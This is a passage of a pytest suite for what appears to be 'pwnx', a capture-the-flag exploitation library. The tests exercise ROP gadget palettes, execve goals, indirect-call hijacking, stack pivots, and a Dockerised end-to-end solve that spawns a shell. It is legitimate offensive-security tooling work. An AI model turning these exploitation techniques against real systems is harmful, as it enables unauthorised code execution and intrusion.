    store = store_menu(challenge)
    attach_execve_goal(challenge, store, address=BUFFER, table=TABLE)
    attach_execve_goal(
        challenge,
        store,
        address=BUFFER + 0x10000,
        table=TABLE + 0x10000,
    )

    names = sequence_names(challenge.plan())

    assert len(names) == 6
    assert len(set(names)) == 6
    assert {name.rsplit("#", 1)[1] for name in names} == {
        "1", "2", "3", "4", "5", "6"
    }


def test_repeated_planning_keeps_menu_ids_and_plan_stable_with_two_goals(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    attach_execve_goal(challenge, store, address=BUFFER, table=TABLE)
    attach_execve_goal(
        challenge,
        store,
        address=BUFFER + 0x10000,
        table=TABLE + 0x10000,
    )
    next_id = store._next_operation_id

    first = challenge.plan()
    second = challenge.plan()

    assert first.to_dict() == second.to_dict()
    assert sequence_names(first) == sequence_names(second)
    assert store._next_operation_id == next_id


@pytest.mark.parametrize(
    "declaration",
    [
        {"pop": {"mystery": POP_RDI}},
        {"zero": {"wat": XOR_EAX}},
        {"move": {("rax", "unknown"): MOV_EAX_ECX}},
    ],
)
def test_explicit_palette_rejects_unknown_registers(
    tmp_path: Path,
    declaration: dict,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(PlanningError, match="unknown|register"):
        challenge.rop.palette(**declaration)


def test_pinned_palette_rejects_unknown_register(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    with pytest.raises(PlanningError, match="unknown|register|gadget"):
        challenge.rop.palette(pinned={"pop mystery; ret": POP_RDI})


def test_indirect_call_state_rejects_unknown_register(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = challenge.buffer(
        "message", at=BUFFER, size=0x1000, writer=store.message
    )
    with pytest.raises(PlanningError, match="unknown|register"):
        challenge.indirect_call(
            table=TABLE,
            index=store.color,
            target=message.qword(PIVOT_OFFSET),
            trigger=store.show,
            state={"mystery": message.address},
        )


def test_pivot_rejects_unknown_pointer_register(tmp_path: Path) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = challenge.buffer(
        "message", at=BUFFER, size=0x1000, writer=store.message
    )
    dispatch = challenge.indirect_call(
        table=TABLE,
        index=store.color,
        target=message.qword(PIVOT_OFFSET),
        trigger=store.show,
        state={"rax": message.address},
    )
    with pytest.raises(PlanningError, match="unknown|register"):
        dispatch.pivot(
            stack=message,
            pointer_register="mystery",
            gadget=PIVOT,
        )


def test_register_aliases_are_canonical_across_palette_state_and_pivot(
    tmp_path: Path,
) -> None:
    challenge = Challenge(make_elf(tmp_path / "challenge", pie=False))
    store = store_menu(challenge)
    message = challenge.buffer(
        "message", at=BUFFER, size=0x1000, writer=store.message
    )
    palette = challenge.rop.palette(
        pop={"r8d": POP_RDI},
        zero={"eax": XOR_EAX},
        move={("edx", "eax"): MOV_EDX_EAX},
    )
    dispatch = challenge.indirect_call(
        table=TABLE,
        index=store.color,
        target=message.qword(PIVOT_OFFSET),
        trigger=store.show,
        state={"eax": message.address},
    )
    pivot = dispatch.pivot(
        stack=message,
        pointer_register="eax",
        gadget=PIVOT,
    )

    assert palette.pop["r8"] == POP_RDI
    assert palette.zero["rax"] == XOR_EAX
    assert palette.move[("rdx", "rax")] == MOV_EDX_EAX
    assert dispatch.state["rax"] == message.address
    assert pivot.pointer_register == "rax"


@pytest.mark.skipif(
    os.environ.get("PWNX_RUN_CTF_E2E") != "1"
    or not (DICE_CHALLENGE / "challenge").is_file(),
    reason="set PWNX_RUN_CTF_E2E=1 with the Dice challenge artifact present",
)
def test_real_dice_message_store_solve_gets_shell() -> None:
    repository = Path(__file__).parents[1]
    command = [
        "docker",
        "run",
        "--rm",
        "-i",
        "-e",
        "PYTHONPATH=/pwnx/src",
        "-v",
        f"{repository}:/pwnx:ro",
        "-v",
        f"{DICE_CHALLENGE}:/chall",
        "-w",
        "/chall",
        "pwnx-test-linux:24.04",
        "python3",
        "solve_pwnx.py",
    ]
    result = subprocess.run(
        command,
        input=b"echo __PWNX_SHELL__; exit\n",
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=15,
        check=False,
    )

    assert result.returncode == 0, result.stdout.decode(errors="replace")
    assert b"__PWNX_SHELL__" in result.stdout
